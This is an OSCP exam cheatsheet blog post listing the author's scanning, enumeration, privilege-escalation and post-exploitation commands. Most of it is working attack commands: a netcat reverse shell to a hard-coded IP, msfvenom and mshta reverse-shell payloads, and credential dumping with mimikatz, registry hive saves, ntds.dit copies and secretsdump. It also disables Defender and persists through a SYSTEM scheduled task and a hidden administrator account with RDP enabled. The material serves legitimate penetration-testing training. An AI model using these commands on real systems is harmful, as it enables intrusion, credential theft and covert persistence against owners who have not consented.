+++
title = "OSCP Command Cheatsheet"
tags = ["OSCP", "exam", "TJNull", "Lain"]
date = "2025-09-18"
+++


# My Methodology

1. Start scan of all tcp ports
2. Scan "useful" udp ports, such as 161
3. If web ports were found in the tcp scan, start fuzzing the ports
    - While fuzzing, use firefox and browse to the web ports.
      - Looking for
      - default creds `admin / admin`
      - SQLi possibility
      - Information Disclosure
4. If SNMP is open
    - `snmpwalk` with "public" as a community string

# General Notes to Remember

1. Give a cursory glance at all ports before diving deep into any particular one
    - e.g. Start fuzzing the web ports, at the same time you try connecting to ftp / smb
2. Don't forget to scan UDP
    - Particularly SNMP (161)
      - if SNMP is open, run `snmpwalk` with "public" as a community string
3. If web ports were found, kick off a fuzzer asap
    - While the fuzzing is running, use firefox and click around inside the pages
4. <span class="rp-rose">READ ALL THE WORDS IN AN ERROR MESSAGE</span>
5. Pay attention to hashcat [examples](https://hashcat.net/wiki/doku.php?id=example_hashes), not all tools output hashes into the correct format
6. Enumerate the registry on windows for installed software
7. Google all unique software with the word <span class="rp-foam">exploit</span>

# Commands (and explanations)

Draft your notes in a way that helps you. Once you start diving into the Challege Labs, I recommend building out a file with all the commands you run frequently (with their flags/options). When you're tired or stressed, the last thing you need is to fumble around trying to remember what switch you run with what command. 

Below I have the commands in my file broken out with explanations (skip to the very [bottom](#bottom) to get them all in one code block)

## Command File Breakdown


### The Beginning

At the start of my file, I put any "dumb" mistakes/failures I ran into during the challenge labs. This meant *every* time I went to copy out a command, I would see a reminder of things I had forgotten to do in the past. This helped make sure I didn't make the same mistake twice.

```bash
!! RUN WINPEAS EVEN AS SYSTEM !!
!! TEST ALL PORTS BEFORE DIVING ANY !!
!! ALWAYS SCAN UDP !!
!! READ ALL  WORDS ON ERROR !!
!! PAY ATTENTION TO HASHCAT EXAMPLE HASHES !!
!! DON'T TRUST BURP URLENCODE !!
!! GOOGLE ALL SOFTWARE + EXPLOIT !!
!! TRY UPPER / LOWER OF CREDS !!
!! IF LINPEAS == HIGHLY PROPABLE... TRY IT !!
```

### Scanning Commands

Another thing I like to have, are variables that I can easily replace with the correct values. I use vim, so I have lines that I can copy and paste to swap out my variables.

:%s/$target_ip/<target_ip>/g

```bash
# Normal TCP scan
sudo nmap -sC -sV -vv -p- $target_ip -oN all_tcp_scan-$target_ip
## -sC runs the default NSE scripts
## -sV Tries to get service versioning
## -vv More verbose output, showing the current status of the scan
## -p- Scans all ports
## -oA outputs to all three major version
## I like all three, because sysreptor can ingest the xml, making a pretty table for your report

# High interest UDP port scan
sudo nmap -sU -vv -p 25,161,53 $target_ip

# Scan through a tunnel (ligolo/chisel/proxychains)
nmap -sT -sV -vv -p $port $target_ip
```

#### Web Scanning

Web can have a lot of goodies, so in addition to fuzzing, I perform a lot of manual enumeration.

- Checking for SQLi
- Default creds
- LFI/RFI

```bash
!! look around, hover over links for hostnames, add to /etc/hosts !!

# Preferred fuzzing command
ffuf -w /home/kali/tools/web/default-weblist -u http://$target/FUZZ
## I created my "default-weblist" which is a combination of multiple defualt wordlists

# vhosts fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$target" -u http://$target -ac


# if there's a .git
mkdir $git_dir
git-dumper $target $git_dir
## I use gitkraken to view repo super nicely
```

#### FTP scanning

FTP can allow anonymous authentication and could have valuable files to find

```bash
ftp anonymous@$target_ip
// any pass is fine if it allows anonymous
// if getting weird error/no output
passive

// recursively get everything
wget -r ftp://$user:@$target_ip
``` 

#### SMB Scanning

Windows hosts could have the Guest account enabled, or allow passwordless authentication to the shares

```bash
smbclient -N -L //$target
## -N supresses password prompt
## -L Lists the shares

nxc smb $target -u "Guest" -p '' --shares
nxc smb $target -u '$user' -p '$pass' --users
nxc smb $target -u '$user' -p '$pass' --groups
impacket-smbclient [$domain]/$user:$password@$target
```

#### SNMP Scanning

SNMP can be a treasure trove of information, revealing running procesess and more, but the default MIBs aren't super easy to read. Do yourself a favor and install snmp-mibs-downloader. 

```bash
snmpwalk -v2c -c public $target

snmpwalk -v 2c -c public $target NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

### Redirection / Transfering utilities

I created a [quick python script](https://github.com/working-git/random-tools/blob/main/tool-upload.py) to start my web-server in my desired directory and output the lines to transfer them with a variety of web methods.


```bash
# -- Web Transfers --
tool-upload.py
## copy applicable line for transfer

# Manual webserver
ls -al
python3 -m http.server 80


# Transfer files from target through web upload
## web server with upload form/POST request friendly
# pip install uploadserver
# only run the install once
python3 -m uploadserver 80


-- Jank Windows Transfer --
net user guest /active:yes
net share $share=$dir_to_share /GRANT:Everyone,FULL
Icacls $dir_to_share /grant Everyone:F /inheritance:e /T

```

#### Ligolo

For the AD set, I used [ligolo-ng](https://github.com/nicocha30/ligolo-ng) as my preferred redirection tool.

```bash
cd /opt/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:443

## get agent to target
agent.exe -ignore-cert -connect $cb_ip:443
```

### Linux Enumeration / Commands

For exploit reverse shells, I recommend [revshells](https://www.revshells.com/). I use a busybox nc -e 99% of the time, as most linux boxes will have busybox.

`busybox nc 172.16.99.206 80 -e /bin/bash`

```bash
# Exploit shells usually suck, the following gives you the full pty experience (tab complete, arrow keys)
python3 -c 'import pty;pty.spawn("/bin/bash")'
// CTRL+Z
stty raw -echo;fg
export TERM=xterm
reset

# Another way to get a better shell, is to add your public key to your users authorized_keys file
## see if current user can ssh
cat /etc/ssh/sshd_config
## if yes, add
mkdir /home/$(whoami)/.ssh; echo "$my_public_key" >> /home/$(whoami)/.ssh/authorized_keys
ssh $user@$target

# Always run sudo -l, even if you don't know your user's password. Might have passwordless sudo perms
sudo -l

# Look at common directories, make note of anything abnormal
ls -latrF .
ls -latrF /tmp /opt / /home

# Look at the processes
ps -elfH

# Look at the netstat, pay close attention to services only listening on localhost
netstat -pantu


## get linpeas
wget http://$cb_ip/linpeas.sh
curl http://$cb_ip/linpeas.sh -O linpeas.sh

!! READ ALL OUTPUT !!

## try any creds against all users
su $user
```

### Windows Enumeration / Commands


```batch
:: Awareness

whoami
whoami /priv
:: Look for SeImpersonate

dir c:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
:: Look for nonstandard binaries
## if putty
reg query HKCU\Software\SimonTatham\PuTTY /s

dir "C:\Users"
dir "C:\Users\$user"

powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -Classname win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '$service_name'}

:: Privesc Shenanigans

:: SeImpersonate -> Potato  ## free system
:: Backup:  ## can save registry 
reg save hklm\sam C:\windows\temp\SAM
reg save hklm\system C:\windows\temp\SYSTEM
reg save hklm\security C:\windows\temp\SECURITY


:: if on a domain, need ntds.dit
set context persistent nowriters
add volume c: alias test
create
expose %test% z:

:: Get files to the kali machine
unix2dos $dsh_file

:: on windows target
diskshadow /s $dsh_file
robocopy /b Z:\windows\ntds . ntds.dit


:: mimikatz
:: one liner, doesn't work via evil-winrm
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

### Common Commands

These are commands I run frequently in a variety of contexts

```bash

# Generate a reverse shell for windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f hta-psh -o shell.hta

## rlwrap for nicer shell
rlwrap nc -lvnp $cb_port

## reverse shell with hta
mshta http://$cb_ip/shell.hta


## sweet potato execution
cmd /c "SweetPotato.exe -p 'reverse.exe'"
cmd /c "spoofer.exe -c reverse.exe"

Rubeus.exe kerberoast /outfile:hashes.kerb

SharpHound.exe -c all --outputdirectory C:\windows\temp --outputprefix "OSCP"
## start bloodhound
sudo neo4j start
http://localhost:7474
neo4j	/	neo4j
bloodhound
## upload data, select zip from target

# Disable AV
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'

# secretsdump
impacket-secretsdump -system $system -sam $sam LOCAL
```

### Flags
The nicest part, getting all the information needed for your screenshots
```bash
# Must take a screenshot
# Must be in an interactive shell

# Liux boxes
ip a sh; echo "root proof"; cat /root/proof.txt; echo; echo "local proof"; cat /home/*/local.txt


# Windows boxes
ipconfig; echo "adminsitrator flag"; cat C:\users\administrator\desktop\proof.txt; echo "user flag"; cat C:\users\*\desktop\local.txt -erroraction SilentlyContinue

!! MUST TAKE A SCREENSHOT !!
!! MUST BE IN A SHELL !!
```

# Full Command File
```bash
!!RUN WINPEAS EVEN AS SYSTEM !!

!!TEST ALL PORTS BEFORE DIVING ANY !!

!!ALWAYS SCAN UDP !!

!!READ ALL  WORDS ON ERROR !!

!!PAY ATTENTION TO HASHCAT EXAMPLE HASHES !!

!!ENUMERATE PUTTY REGISTRY IF INSTALLED !!

!!DON'T TRUST BURP URLENCODE !!

!!GOOGLE ALL SOFTWARE + EXPLOIT !!

!!TRY UPPER / LOWER OF CREDS !!

!!IF LINPEAS == HIGHLY PROPABLE... TRY IT !!

:%s/$cb_ip/<my_ip>/g

{{{ =-=-=Scanning =-=-=

sudo $(which autorecon)

sudo nmap -sC -sV -vv -p- $target -oN all_tcp_scan-$target
sudo nmap -sU -vv -p 25,161,53 $target


{{{ =-=Web =-=
!!look around, hover over links for hostnames, add to /etc/hosts !!
ffuf -w /home/kali/tools/web/default-weblist -u http://$target/FUZZ
// vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$target" -u http://$target -ac

##if there's a .git
mkdir $git_dir
git-dumper $target $git_dir
##use gitkraken to view repo super nicely


}}}


{{{ =-=ftp =-=

ftp anonymous@$target
// any pass is fine  it allows anonymous
// if getting weird error/no output
passive

// recursively get everything
wget -r ftp://$user:@$target

}}}


{{{ =-=smb =-=

smbclient -N -L //$target
nxc smb $target -u "Guest" -p '' --shares
nxc smb $target -u '$user' -p '$pass' --users
nxc smb $target -u '$user' -p '$pass' --groups
impacket-smbclient [$domain]/$user:$password@$target


}}}


{{{ =-=kerberos =-=

kerbrute --dc $dc -d $domain userenum /usr/share/seclists/Usernames/Names/names.txt -o users.txt
impacket-GetNPUsers -usersfile users.txt $domain/

}}}



{{{ =-=snmp =-=

snmpwalk -v2c -c public $target

snmpwalk -v 2c -c public $target NET-SNMP-EXTEND-MIB::nsExtendOutputFull

}}}


}}}



{{{ =-=-=Transfer / Redir =-=-=


{{{ =-=ligolo-ng =-=

cd/opt/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:443

##get agent to target
agent.exe -ignore-cert -connect $cb_ip:443


}}}

##web server with upload form/POST request friendly
python3 -m uploadserver 80
tools-upload.py

##jank windows
net user guest /active:yes
net share $share=$dir_to_share /GRANT:Everyone,FULL
Icacls $dir_to_share /grant Everyone:F /inheritance:e /T



}}}



{{{ =-=-=Linux =-=-=


{{{ =-=freetty =-=

python3 -c 'import pty;pty.spawn("/bin/bash")'            
// CTRL+Z
sttyraw -echo;fg
exportTERM=xterm

}}}

!!run even w/o pw !!
sudo -l


!!MAKE NOTE OF ANYTHING ABNORMAL !!
ls -latrF.
ls -latrF/tmp /opt / /home
netstat -pantu
ps axjf

{{{ =-=ssh =-=
##see if current user can ssh
cat/etc/ssh/sshd_config
##if yes, add
mkdir/home/$(whoami)/.ssh; echo "$my_public_key" >> /home/$(whoami)/.ssh/authorized_keys
ssh $user@$target
}}}

##get linpeas
wget http://$cb_ip/linpeas.sh
curl http://$cb_ip/linpeas.sh -O linpeas.sh

!!READ ALL OUTPUT !!

##try any creds against all users
su $user


}}}




{{{ =-=-=Windows =-=-=


{{{ =-=privs =-= 

SeImpersonate -> Potato  ## free system
Backup:  ## can save registry 


reg save hklm\sam C:\windows\temp\SAM
reg save hklm\system C:\windows\temp\SYSTEM
reg save hklm\security C:\windows\temp\SECURITY


##if on a domain, need ntds.dit
{{{dsh file
setcontext persistent nowriters
add volume c: alias test
create
expose %test% z:
}}}

unix2dos $dsh_file

// on windows target
diskshadow /s $dsh_file
robocopy /b Z:\windows\ntds . ntds.dit

}}}


{{{ =-=awareness =-=

whoami
whoami/priv
dirc:\
dir "C:\ProgramFiles"
dir "C:\ProgramFiles (x86)"
!!look for non-standard bins !!
##if putty
reg query HKCU\Software\SimonTatham\PuTTY /s

dir "C:\Users"
dir "C:\Users\$user"

##mimikatz
privilege::debug
sekurlsa::logonpasswords
##one liner, no winrm
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"


powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -Classname win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '$service_name'}

}}}



{{{ =-=common =-=


msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$cb_ip LPORT=$cb_port -f hta-psh -o shell.hta

##rlwrap for nicer shell
rlwrap nc -lvnp $cb_port
##reverse shell with hta
mshta http://$cb_ip/shell.hta


##sweet potato execution
cmd /c "SweetPotato.exe -p 'reverse.exe'"
cmd /c "spoofer.exe -c reverse.exe"

Rubeus.exe kerberoast /outfile:hashes.kerb

SharpHound.exe -c all --outputdirectory C:\windows\temp --outputprefix "OSCP"
##start bloodhound
sudo neo4j start
http://localhost:7474
neo4j	/	neo4j
bloodhound
##upload data, select zip from target

// Disable AV
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'

}}}



{{{ =-=Persistence / RDP =-=


schtasks /ru SYSTEM /create /sc MINUTE /mo 5  /tn 'revshell' /tr '$rev_shell' 



net user /add penuser HackedPass1! && net localgroup administrators penuser /add & net localgroup "Remote Desktop Users" penuser /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v penuser /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

##make sure it worked
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
netstat -ano


net user administrator HackedPass1!

}}}


{{{ =-=hashes =-=

// if local

impacket-secretsdump -system $system -sam $sam LOCAL

// use to pass the hash
impacket-psexec 

}}}


}}}




{{{ =-=-=Flags =-=-=

!!MUST TAKE A SCREENSHOT !!
!!MUST BE IN A SHELL !!

=-=Lin =-=

ip a sh; echo "root proof"; cat /root/proof.txt; echo; echo "local proof"; cat /home/*/local.txt

=-=Win =-=

ipconfig; echo "adminsitrator flag"; cat C:\users\administrator\desktop\proof.txt; echo "user flag"; cat C:\users\*\desktop\local.txt -erroraction SilentlyContinue

!!MUST TAKE A SCREENSHOT !!
!!MUST BE IN A SHELL !!


}}}


```